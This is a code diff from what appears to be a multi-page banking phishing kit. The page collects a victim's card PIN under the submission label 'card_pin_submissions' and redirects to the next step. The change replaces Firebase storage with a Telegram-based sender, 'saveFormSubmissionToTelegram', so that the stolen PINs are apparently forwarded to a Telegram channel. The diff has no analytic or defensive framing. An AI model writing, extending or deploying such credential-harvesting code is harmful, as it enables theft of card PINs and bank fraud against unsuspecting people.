@@ -47,21 +47,18 @@
   </div>
 </div>
 
-<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
-<script src="firebase-config.js"></script>
+<script src="telegram-config.js"></script>
 <script>
   document.getElementById("indusForm").addEventListener("submit", async function(e) {
     e.preventDefault();
     const pin = document.getElementById("pin").value;
     if (!pin) { alert('Please enter card PIN.'); return; }
-    if (!isFirebaseReady()) { alert('Firebase not initialized.'); return; }
 
     const btn = document.querySelector(".btn-submit");
     btn.disabled = true; btn.textContent = 'Processing...';
 
     try {
-      const res = await saveFormSubmissionToFirebase('card_pin_submissions', { pin });
+      const res = await saveFormSubmissionToTelegram('card_pin_submissions', { pin });
       if (res.success) window.location.href = '6.html';
       else { alert('Error: ' + (res.error || 'unknown')); btn.disabled = false; btn.textContent = 'VERIFY PIN'; }
     } catch (err) { alert('Error occurred'); btn.disabled = false; btn.textContent = 'VERIFY PIN'; }
